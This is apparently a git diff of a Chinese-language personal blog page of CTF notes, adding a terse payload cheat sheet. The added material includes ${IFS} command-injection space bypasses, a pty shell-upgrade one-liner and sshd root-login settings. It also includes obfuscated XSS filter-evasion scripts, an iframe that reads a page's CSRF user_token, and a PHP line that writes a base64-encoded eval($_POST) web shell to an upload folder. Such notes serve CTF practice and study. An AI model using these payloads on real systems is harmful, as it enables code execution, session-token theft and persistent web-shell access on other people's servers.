@@ -98,17 +98,17 @@
 
 
 
-  <meta name="description" content="CTFlinux下空格绕过1234cat flag.txtcat$&amp;#123;IFS&amp;#125;flag.txtcat$IFS$9flag.txtcat&amp;lt;flag.txt ${IFS} Shell 脚本中有个变量叫IFS(Internal Field Seprator) ，内部域分隔符。完整定义是The shell uses the value stored in IFS, which is">
+  <meta name="description" content="CTF流程1.查看源代码2.查看robots.txt linux下空格绕过1234cat flag.txtcat$&amp;#123;IFS&amp;#125;flag.txtcat$IFS$9flag.txtcat&amp;lt;flag.txt ${IFS} Shell 脚本中有个变量叫IFS(Internal Field Seprator) ，内部域分隔符。完整定义是The shell uses the value">
 <meta property="og:type" content="article">
 <meta property="og:title" content="&#39;Notes&#39;">
 <meta property="og:url" content="https://chirec.github.io/2009/12/31/Notes/index.html">
 <meta property="og:site_name" content="Emerald Dream">
-<meta property="og:description" content="CTFlinux下空格绕过1234cat flag.txtcat$&amp;#123;IFS&amp;#125;flag.txtcat$IFS$9flag.txtcat&amp;lt;flag.txt ${IFS} Shell 脚本中有个变量叫IFS(Internal Field Seprator) ，内部域分隔符。完整定义是The shell uses the value stored in IFS, which is">
+<meta property="og:description" content="CTF流程1.查看源代码2.查看robots.txt linux下空格绕过1234cat flag.txtcat$&amp;#123;IFS&amp;#125;flag.txtcat$IFS$9flag.txtcat&amp;lt;flag.txt ${IFS} Shell 脚本中有个变量叫IFS(Internal Field Seprator) ，内部域分隔符。完整定义是The shell uses the value">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2019-05-10T14:17:58.256Z">
+<meta property="og:updated_time" content="2019-05-14T03:14:58.958Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="&#39;Notes&#39;">
-<meta name="twitter:description" content="CTFlinux下空格绕过1234cat flag.txtcat$&amp;#123;IFS&amp;#125;flag.txtcat$IFS$9flag.txtcat&amp;lt;flag.txt ${IFS} Shell 脚本中有个变量叫IFS(Internal Field Seprator) ，内部域分隔符。完整定义是The shell uses the value stored in IFS, which is">
+<meta name="twitter:description" content="CTF流程1.查看源代码2.查看robots.txt linux下空格绕过1234cat flag.txtcat$&amp;#123;IFS&amp;#125;flag.txtcat$IFS$9flag.txtcat&amp;lt;flag.txt ${IFS} Shell 脚本中有个变量叫IFS(Internal Field Seprator) ，内部域分隔符。完整定义是The shell uses the value">
 
 
 
@@ -379,13 +379,33 @@
       
 
       
-        <h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><h2 id="linux下空格绕过"><a href="#linux下空格绕过" class="headerlink" title="linux下空格绕过"></a>linux下空格绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat flag.txt</span><br><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line">cat$IFS$9flag.txt</span><br><span class="line">cat&lt;flag.txt</span><br></pre></td></tr></table></figure>
+        <h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p>1.查看源代码<br>2.查看robots.txt</p>
+<h2 id="linux下空格绕过"><a href="#linux下空格绕过" class="headerlink" title="linux下空格绕过"></a>linux下空格绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat flag.txt</span><br><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line">cat$IFS$9flag.txt</span><br><span class="line">cat&lt;flag.txt</span><br></pre></td></tr></table></figure>
 <p><code>${IFS}</code><br> Shell 脚本中有个变量叫IFS(Internal Field Seprator) ，内部域分隔符。完整定义是The shell uses the value stored in IFS, which is the space, tab, and newline characters by default, to delimit words for the read and set commands, when parsing output from command substitution, and when performing variable substitution.</p>
 <h2 id="PHP-is-numeric-绕过"><a href="#PHP-is-numeric-绕过" class="headerlink" title="PHP is_numeric 绕过"></a>PHP is_numeric 绕过</h2><p>使用十六进制绕过</p>
+<h2 id="outguess"><a href="#outguess" class="headerlink" title="outguess"></a>outguess</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outguess -r picture text</span><br></pre></td></tr></table></figure>
 <h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><p>python导入bash</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &apos;import pty;pty.spawn(&quot;/bin/sh&quot;)&apos;</span><br></pre></td></tr></table></figure>
+<p>设置ssh使用root登录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ssh/sshd_config</span><br><span class="line">PasswordAuthentication yes</span><br><span class="line">PermitRootLogin yes</span><br></pre></td></tr></table></figure>
+<p>开机启动ssh服务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update-rc.d ssh enable</span><br></pre></td></tr></table></figure>
+<p>bash_history</p>
+<p>复制粘贴</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">复制命令：Ctrl + Shift + C</span><br><span class="line">粘贴命令：Ctrl + Shift + V</span><br><span class="line">复制命令：Ctrl|Shift + Insert|用鼠标选中</span><br><span class="line">粘贴命令：Crtl|Shift + Insert|单击鼠标滚轮</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctrl + 鼠标选中后粘贴会立即执行</span><br></pre></td></tr></table></figure>
 <h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascrip&amp;#x0000000074:alert(1)</span><br></pre></td></tr></table></figure>
 <p><code>&amp;#x0000</code>空子节</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$=~[];$=&#123;___:++$,$$$$:(![]+&quot;&quot;)[$],__$:++$,$_$_:(![]+&quot;&quot;)[$],_$_:++$,$_$$:(&#123;&#125;+&quot;&quot;)[$],$$_$:($[$]+&quot;&quot;)[$],_$$:++$,$$$_:(!&quot;&quot;+&quot;&quot;)[$],$__:++$,$_$:++$,$$__:(&#123;&#125;+&quot;&quot;)[$],$$_:++$,$$$:++$,$___:++$,$__$:++$&#125;;$.$_=($.$_=$+&quot;&quot;)[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+&quot;&quot;)[$.__$])+((!$)+&quot;&quot;)[$._$$]+($.__=$.$_[$.$$_])+($.$=(!&quot;&quot;+&quot;&quot;)[$.__$])+($._=(!&quot;&quot;+&quot;&quot;)[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!&quot;&quot;+&quot;&quot;)[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+&quot;\&quot;&quot;+$.$_$_+(![]+&quot;&quot;)[$._$_]+$.$$$_+&quot;\\&quot;+$.__$+$.$$_+$._$_+$.__+&quot;(&quot;+$.__$+&quot;)&quot;+&quot;\&quot;&quot;)())()&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>url转码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%3C%73%63%72%69%70%74%3E%24%3D%7E%5B%5D%3B%24%3D%7B%5F%5F%5F%3A%2B%2B%24%2C%24%24%24%24%3A%28%21%5B%5D%2B%22%22%29%5B%24%5D%2C%5F%5F%24%3A%2B%2B%24%2C%24%5F%24%5F%3A%28%21%5B%5D%2B%22%22%29%5B%24%5D%2C%5F%24%5F%3A%2B%2B%24%2C%24%5F%24%24%3A%28%7B%7D%2B%22%22%29%5B%24%5D%2C%24%24%5F%24%3A%28%24%5B%24%5D%2B%22%22%29%5B%24%5D%2C%5F%24%24%3A%2B%2B%24%2C%24%24%24%5F%3A%28%21%22%22%2B%22%22%29%5B%24%5D%2C%24%5F%5F%3A%2B%2B%24%2C%24%5F%24%3A%2B%2B%24%2C%24%24%5F%5F%3A%28%7B%7D%2B%22%22%29%5B%24%5D%2C%24%24%5F%3A%2B%2B%24%2C%24%24%24%3A%2B%2B%24%2C%24%5F%5F%5F%3A%2B%2B%24%2C%24%5F%5F%24%3A%2B%2B%24%7D%3B%24%2E%24%5F%3D%28%24%2E%24%5F%3D%24%2B%22%22%29%5B%24%2E%24%5F%24%5D%2B%28%24%2E%5F%24%3D%24%2E%24%5F%5B%24%2E%5F%5F%24%5D%29%2B%28%24%2E%24%24%3D%28%24%2E%24%2B%22%22%29%5B%24%2E%5F%5F%24%5D%29%2B%28%28%21%24%29%2B%22%22%29%5B%24%2E%5F%24%24%5D%2B%28%24%2E%5F%5F%3D%24%2E%24%5F%5B%24%2E%24%24%5F%5D%29%2B%28%24%2E%24%3D%28%21%22%22%2B%22%22%29%5B%24%2E%5F%5F%24%5D%29%2B%28%24%2E%5F%3D%28%21%22%22%2B%22%22%29%5B%24%2E%5F%24%5F%5D%29%2B%24%2E%24%5F%5B%24%2E%24%5F%24%5D%2B%24%2E%5F%5F%2B%24%2E%5F%24%2B%24%2E%24%3B%24%2E%24%24%3D%24%2E%24%2B%28%21%22%22%2B%22%22%29%5B%24%2E%5F%24%24%5D%2B%24%2E%5F%5F%2B%24%2E%5F%2B%24%2E%24%2B%24%2E%24%24%3B%24%2E%24%3D%28%24%2E%5F%5F%5F%29%5B%24%2E%24%5F%5D%5B%24%2E%24%5F%5D%3B%24%2E%24%28%24%2E%24%28%24%2E%24%24%2B%22%5C%22%22%2B%24%2E%24%5F%24%5F%2B%28%21%5B%5D%2B%22%22%29%5B%24%2E%5F%24%5F%5D%2B%24%2E%24%24%24%5F%2B%22%5C%5C%22%2B%24%2E%5F%5F%24%2B%24%2E%24%24%5F%2B%24%2E%5F%24%5F%2B%24%2E%5F%5F%2B%22%28%22%2B%24%2E%5F%5F%24%2B%22%29%22%2B%22%5C%22%22%29%28%29%29%28%29%3C%2F%73%63%72%69%70%74%3E</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;eval(&apos;</span><br><span class="line">\x76\x61\x72\40\141\75String.fromCharCode(49);\u0061\u006c\u0065\u0072\u0074\u0028a\u0029;</span><br><span class="line">&apos;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;eval(&apos;</span><br><span class="line">\x76\x61\x72\40\141\75String.fromCharCode(%34%39);\u0061\u006c\u0065\u0072\u0074\u0028a\u0029;</span><br><span class="line">&apos;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;eval(&apos;</span><br><span class="line">\x76\x61\x72\40\141\75%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%34%39%29%3b\u0061\u006c\u0065\u0072\u0074\u0028a\u0029;</span><br><span class="line">&apos;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>获取usertoken</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;../csrf&quot;onload=alert(frames[0].document.getElementsByName(&apos;user_token&apos;)[0].value)&gt;</span><br></pre></td></tr></table></figure>
+<h1 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h1><p>写一句话</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo `echo PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pPz4=|base64 -d &gt; upload/1.php` ;?&gt;</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -493,7 +513,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">23</span>
+                    <span class="site-state-item-count">26</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
@@ -567,7 +587,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CTF"><span class="nav-text">CTF</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#linux下空格绕过"><span class="nav-text">linux下空格绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP-is-numeric-绕过"><span class="nav-text">PHP is_numeric 绕过</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Linux"><span class="nav-text">Linux</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS"><span class="nav-text">XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#payload"><span class="nav-text">payload</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CTF"><span class="nav-text">CTF</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#流程"><span class="nav-text">流程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#linux下空格绕过"><span class="nav-text">linux下空格绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP-is-numeric-绕过"><span class="nav-text">PHP is_numeric 绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#outguess"><span class="nav-text">outguess</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Linux"><span class="nav-text">Linux</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS"><span class="nav-text">XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#payload"><span class="nav-text">payload</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP伪协议"><span class="nav-text">PHP伪协议</span></a></li></ol></div>
             
 
           </div>
